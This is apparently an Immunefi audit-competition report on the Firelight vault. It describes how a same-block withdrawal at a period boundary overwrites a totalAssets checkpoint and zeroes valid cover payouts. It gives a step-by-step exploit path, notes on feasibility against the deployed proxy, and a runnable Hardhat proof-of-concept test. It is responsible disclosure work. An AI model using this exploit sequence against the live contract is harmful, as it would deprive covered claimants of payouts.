# 89854 sc high same block withdrawal rewrites committed period start assets and makes valid cover payouts zero

**Submitted on Aug 21st 2026 at 14:23:06 UTC by @Shutaru for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89854
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Severity and impact

**Suggested severity: Critical — protocol insolvency.**

A vault depositor can place a normal withdrawal after `commitAllocation` in the first block of a cover period. When both transactions have the exact period-start timestamp, the withdrawal replaces the `totalAssets` checkpoint that the allocator already used to commit cover capacity. A later valid incident then pays zero, even though the withdrawal remains pending and the depositor can claim all of it after the cooldown.

The depositor does not need a privileged role. The allocator, curator, and assessment approver follow their intended paths. The race requires the allocation commitment and withdrawal to land in that order in the exact period-boundary block.

## Root cause

`FirelightVault` records `totalAssets` with `block.timestamp` as the checkpoint key:

```solidity
uint48 ts = Time.timestamp();
...
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

`Checkpoints.Trace256.push` does not append a second checkpoint when the key matches the latest key. It replaces the stored value:

```solidity
if (exists && key == lastKey) {
    self._values[len - 1] = value;
}
```

The allocator calculates period capacity from the checkpoint at `currentPeriodStart()`:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

Payout later reads the same historical timestamp and treats it as an exposure cap:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
...
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

The value is therefore consumed as immutable history during allocation but remains mutable for the rest of that block.

Affected locations:

* `contracts/core/lib/Checkpoints.sol:198-214`
* `contracts/core/FirelightVault.sol:755-775`
* `contracts/core/FirelightVault.sol:911-930`
* `contracts/core/FirelightVault.sol:1044-1055`
* `contracts/core/CoverOrderAllocator.sol:696-719`

## End-to-end exploit

The PoC uses the real `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`. Only the underlying token and price feed are local test dependencies.

1. The depositor deposits 100 units into the vault.
2. Automining is disabled and the next block timestamp is set to the next period start.
3. The allocator submits a valid commitment for 100 units of cover capacity.
4. The unprivileged depositor submits a withdrawal for all 100 units with lower transaction priority. Both transactions are mined in the same block; the PoC asserts that the commitment precedes the withdrawal.
5. The commitment stores `totalAvailableCapacity = 100` and `totalDeclaredAllocated = 100`.
6. The later withdrawal replaces the checkpoint at the period-start timestamp. `totalAssetsAt(periodStart)` changes to zero, while `withdrawAssets[nextPeriod + 1]` contains the full 100 units.
7. A cover order is settled and a real `CoverNFT` is issued.
8. The curator creates and confirms an incident, adds the covered loss, and submits the assessment.
9. The assessment approver follows the normal approval path. The vault emits `PayoutExecuted(receiver, 100, 0, periodStart)`, the incident records `vaultPaidAmount = 0`, and its status becomes `CLOSED`. A second approval attempt reverts with `InvalidIncidentStatus`, so the unpaid amount cannot be retried through the assessment flow.
10. After the cooldown, the depositor claims the full 100 units.

The negative control moves the withdrawal out of the boundary timestamp. In that case `totalAssetsAt(periodStart)` remains 100 and the vault pays the full 100-unit claim. This isolates equal-timestamp checkpoint replacement as the cause.

## Practical feasibility

The period boundary is deterministic and public. A depositor can watch for the allocator's commitment and backrun it in the same boundary block. This is not a Hardhat-only timestamp condition: a read-only check of the deployed Phase 1 vault and recent Flare block history found blocks whose timestamps exactly matched 28 of the previous 30 scheduled daily period starts. Many of those boundary blocks contained multiple transactions.

The observation was made without changing chain state. The scoped proxy is:

```
0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3
```

## Recommended fix

Do not use a timestamp checkpoint as mutable history after allocation has consumed it. Capture the vault asset value once for the period or commitment, store it immutably, and bind both allocation capacity and payout to that same value.

If the intended value is the state before any transaction in the new period, derive it from the last checkpoint strictly before the boundary and store it once. If deposits at the boundary should count, have the allocator create a one-time snapshot when it commits. In either design, a later transaction with the same timestamp must not change a snapshot already used to underwrite cover.

Add a regression test that commits allocation and then processes a withdrawal in the same boundary block. The payout cap must remain equal to the value used by the commitment.

## Scope and evidence notes

* No privileged role is assumed malicious.
* No mainnet transaction was sent.
* The PoC does not claim that the depositor steals the payout. It proves that committed slashable backing can escape while a valid covered claim receives zero.
* The exact timing precondition is stated rather than hidden: the commitment and withdrawal must execute in order in a block timestamped at the period boundary.

## Proof of Concept

## Proof of Concept

This runnable Hardhat test uses the real `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`. Only the underlying ERC-20 and price-feed dependencies are local test doubles.

Run from the frozen competition repository:

```bash
npx hardhat test test/security/period_start_checkpoint_rewrite.poc.js
```

Expected result:

```
PoC: period-start checkpoint rewrite
  ✔ commits cover against capital, then lets an unprivileged withdrawal erase the payout snapshot
  ✔ does not erase the payout snapshot when the withdrawal lands after the boundary timestamp

2 passing
```

The full suite passes with this file included: **450 passing**.

The positive case asserts all of the following:

1. A 100-unit allocation commitment executes before the withdrawal in the same period-boundary block.
2. The commitment records 100 units of capacity and declared allocation.
3. The later unprivileged withdrawal changes `totalAssetsAt(periodStart)` from 100 to zero while the same 100 units remain queued in `withdrawAssets`.
4. A real cover order settles and mints a `CoverNFT`.
5. A confirmed incident and approved assessment request a 100-unit payout.
6. The vault emits `PayoutExecuted(receiver, 100, 0, periodStart)`.
7. The incident becomes `CLOSED` with `vaultPaidAmount = 0`; another approval attempt reverts with `InvalidIncidentStatus`.
8. The payout receiver receives zero, while the withdrawing depositor later claims all 100 units.

The negative control moves only the withdrawal timestamp past the period boundary. The historical snapshot remains 100 and the same payout transfers all 100 units.

### Test file

```javascript
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { expect } = require("chai");
const { ethers, network, upgrades } = require("hardhat");

const { deployVault, computeMarketId } = require("../setup/fixtures.js");

const DAY = 24 * 60 * 60;
const ONE_18 = 10n ** 18n;
const VAULT_DEPOSIT = 100n * 10n ** 6n;
const COVER_AMOUNT = 100n * ONE_18;

async function deployIntegratedSystem() {
  const ctx = await deployVault({
    decimals: 6,
    initial_deposit_limit: 1_000n * 10n ** 6n,
    period_configuration_duration: DAY,
  });

  const [deployer] = await ethers.getSigners();
  const admin = ctx.deployer;
  const curator = ctx.users[1];
  const allocatorRole = ctx.users[2];
  const configAdmin = ctx.limit_updater;
  const premiumCollector = ctx.rescuer;
  const firstLossBuffer = ctx.blocklister;
  const buyer = ctx.pauser;

  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const premiumToken = await MockERC20.connect(deployer).deploy("MockUSDC", "mUSDC", 6);

  const MockAggregator = await ethers.getContractFactory("MockAggregatorV3");
  const priceFeed = await MockAggregator.connect(deployer).deploy(18, ONE_18);

  const CoverNFT = await ethers.getContractFactory("CoverNFT");
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    ["Firelight Cover", "FLCOVER", "", admin.address, deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: "transparent" },
  );

  const protocol = "Aave";
  const chainId = 1;
  const market = ethers.encodeBytes32String("market-A");
  const marketId = computeMarketId(chainId, protocol, market);

  const Allocator = await ethers.getContractFactory("CoverOrderAllocator");
  const allocator = await upgrades.deployProxy(
    Allocator,
    [
      {
        vault: ctx.firelight_vault.target,
        premiumCollector: premiumCollector.address,
        coverNFT: coverNFT.target,
        priceFeedAdapter: priceFeed.target,
        maxPriceAge: 7 * DAY,
        premiumTokens: [premiumToken.target],
        admin: admin.address,
        adminRole: admin.address,
        curatorRole: curator.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: configAdmin.address,
        initialProtocolConcentrations: [
          {
            protocol,
            chainId,
            maxProtocolConcentrationBps: 10_000,
          },
        ],
        newMarkets: [{ chainId, protocol, market }],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: premiumToken.target,
          firstLossBuffer: firstLossBuffer.address,
          effectiveLeverage: 12_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0,
        },
      },
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await coverNFT.connect(admin).grantRole(await coverNFT.MINTER_ROLE(), allocator.target);

  const assessmentApprover = ctx.period_configuration_updater;
  const IncidentManager = await ethers.getContractFactory("IncidentManager");
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      admin.address,
      curator.address,
      assessmentApprover.address,
      ctx.payout_allowlister.address,
      ctx.incident.address,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ethers.ZeroAddress,
      ctx.payout_receiver.address,
      allocator.target,
      priceFeed.target,
      7 * DAY,
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await ctx.firelight_vault.connect(admin).grantRole(await ctx.firelight_vault.PAYOUT_ROLE(), incidentManager.target);
  await ctx.firelight_vault.connect(admin).grantRole(await ctx.firelight_vault.INCIDENT_ROLE(), incidentManager.target);

  await premiumToken.mint(buyer.address, 10n * 10n ** 6n);
  await premiumToken.connect(buyer).approve(allocator.target, ethers.MaxUint256);

  await allocator
    .connect(curator)
    .createCoverOrder(
      buyer.address,
      buyer.address,
      buyer.address,
      premiumToken.target,
      [{ marketId, coverRateAnnual: 500, coverAmount: COVER_AMOUNT }],
      0,
    );

  return { ...ctx, allocator, allocatorRole, buyer, coverNFT, marketId, incidentManager, curator, assessmentApprover };
}

describe("PoC: period-start checkpoint rewrite", function () {
  it("commits cover against capital, then lets an unprivileged withdrawal erase the payout snapshot", async () => {
    const ctx = await loadFixture(deployIntegratedSystem);
    const depositor = ctx.users[0];

    await ctx.utils.mintAndApprove(VAULT_DEPOSIT, depositor);
    await ctx.firelight_vault.connect(depositor).deposit(VAULT_DEPOSIT, depositor.address);

    const nextPeriod = (await ctx.firelight_vault.currentPeriod()) + 1n;
    const periodStart = await ctx.firelight_vault.currentPeriodEnd();

    const allocations = [[ctx.marketId, COVER_AMOUNT]];
    const tree = StandardMerkleTree.of([[0n, allocations]], ["uint256", "(bytes32,uint256)[]"]);

    await network.provider.send("evm_setAutomine", [false]);
    try {
      await network.provider.send("evm_setNextBlockTimestamp", [Number(periodStart)]);

      const commitTx = await ctx.allocator
        .connect(ctx.allocatorRole)
        .commitAllocation(nextPeriod, tree.root, COVER_AMOUNT, COVER_AMOUNT, {
          gasLimit: 5_000_000,
          gasPrice: 3_000_000_000n,
        });

      const withdrawTx = await ctx.firelight_vault
        .connect(depositor)
        .withdraw(VAULT_DEPOSIT, depositor.address, depositor.address, {
          gasLimit: 5_000_000,
          gasPrice: 2_000_000_000n,
        });

      await network.provider.send("evm_mine");
      const commitReceipt = await commitTx.wait();
      const withdrawReceipt = await withdrawTx.wait();

      expect(commitReceipt.blockNumber).to.equal(withdrawReceipt.blockNumber);
      expect(commitReceipt.index).to.be.lessThan(withdrawReceipt.index);
    } finally {
      await network.provider.send("evm_setAutomine", [true]);
    }

    const commitment = await ctx.allocator.getAllocationCommitment(nextPeriod);
    expect(commitment.totalAvailableCapacity).to.equal(COVER_AMOUNT);
    expect(commitment.totalDeclaredAllocated).to.equal(COVER_AMOUNT);

    // The later transaction in the same timestamp appends a checkpoint exactly at
    // periodStart, changing the historical value used by both capacity and payout.
    expect(await ctx.firelight_vault.totalAssetsAt(periodStart)).to.equal(0n);
    expect(await ctx.firelight_vault.withdrawAssets(nextPeriod + 1n)).to.equal(VAULT_DEPOSIT);

    await ctx.allocator
      .connect(ctx.allocatorRole)
      .settleCoverOrder(0n, [{ marketId: ctx.marketId, allocatedCover: COVER_AMOUNT }], tree.getProof(0));
    expect(await ctx.coverNFT.ownerOf(0n)).to.equal(ctx.buyer.address);

    await ctx.incidentManager
      .connect(ctx.curator)
      .createIncident(periodStart, "Covered protocol loss", ethers.id("period-start-checkpoint-rewrite"));
    await ctx.incidentManager.connect(ctx.curator).confirmIncident(1n, "ipfs://validated-loss");
    await ctx.incidentManager.connect(ctx.curator).addAssessmentLosses(1n, [
      {
        coverTokenId: 0n,
        marketId: ctx.marketId,
        amount: COVER_AMOUNT,
      },
    ]);
    await ctx.incidentManager.connect(ctx.curator).submitCurrentAssessment(1n);

    await expect(ctx.incidentManager.connect(ctx.assessmentApprover).approveCurrentAssessment(1n))
      .to.emit(ctx.firelight_vault, "PayoutExecuted")
      .withArgs(ctx.payout_receiver.address, VAULT_DEPOSIT, 0n, periodStart);

    const [incident] = await ctx.incidentManager.getIncident(1n);
    expect(incident.vaultPaidAmount).to.equal(0n);
    expect(incident.status).to.equal(4n); // CLOSED: the zero payout is final.

    await expect(ctx.incidentManager.connect(ctx.assessmentApprover).approveCurrentAssessment(1n))
      .to.be.revertedWithCustomError(ctx.incidentManager, "InvalidIncidentStatus")
      .withArgs(1n, 4n);

    expect(await ctx.token_contract.balanceOf(ctx.payout_receiver.address)).to.equal(0n);

    await time.increaseTo(periodStart + BigInt(2 * DAY) + 1n);
    await ctx.firelight_vault.connect(depositor).claimWithdraw(nextPeriod + 1n);
    expect(await ctx.token_contract.balanceOf(depositor.address)).to.equal(VAULT_DEPOSIT);
  });

  it("does not erase the payout snapshot when the withdrawal lands after the boundary timestamp", async () => {
    const ctx = await loadFixture(deployIntegratedSystem);
    const depositor = ctx.users[0];

    await ctx.utils.mintAndApprove(VAULT_DEPOSIT, depositor);
    await ctx.firelight_vault.connect(depositor).deposit(VAULT_DEPOSIT, depositor.address);

    const nextPeriod = (await ctx.firelight_vault.currentPeriod()) + 1n;
    const periodStart = await ctx.firelight_vault.currentPeriodEnd();
    const allocations = [[ctx.marketId, COVER_AMOUNT]];
    const tree = StandardMerkleTree.of([[0n, allocations]], ["uint256", "(bytes32,uint256)[]"]);

    await time.increaseTo(periodStart);
    await ctx.allocator.connect(ctx.allocatorRole).commitAllocation(nextPeriod, tree.root, COVER_AMOUNT, COVER_AMOUNT);
    await ctx.firelight_vault.connect(depositor).withdraw(VAULT_DEPOSIT, depositor.address, depositor.address);

    expect(await ctx.firelight_vault.totalAssetsAt(periodStart)).to.equal(VAULT_DEPOSIT);

    await expect(
      ctx.firelight_vault.connect(ctx.payout_signer).payout(ctx.payout_receiver.address, VAULT_DEPOSIT, periodStart),
    )
      .to.emit(ctx.firelight_vault, "PayoutExecuted")
      .withArgs(ctx.payout_receiver.address, VAULT_DEPOSIT, VAULT_DEPOSIT, periodStart);
  });
});
```
